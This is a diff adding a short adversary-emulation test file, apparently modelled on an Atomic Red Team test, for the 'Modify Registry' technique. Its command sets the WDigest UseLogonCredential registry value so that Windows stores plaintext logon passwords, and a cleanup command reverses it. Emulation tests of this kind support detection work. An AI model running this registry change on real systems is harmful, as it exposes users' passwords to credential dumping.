@@ -1,0 +1,12 @@
+#TechniqueName: Modify Registry
+#AtomicTestName: Modify registry to store logon credentials
+#Description: Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).&Upon execution, the message "The operation completed successfully." will be displayed.&Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.&
+#Language: cmd
+
+#commands
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+
+#cleanup_commands
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
+
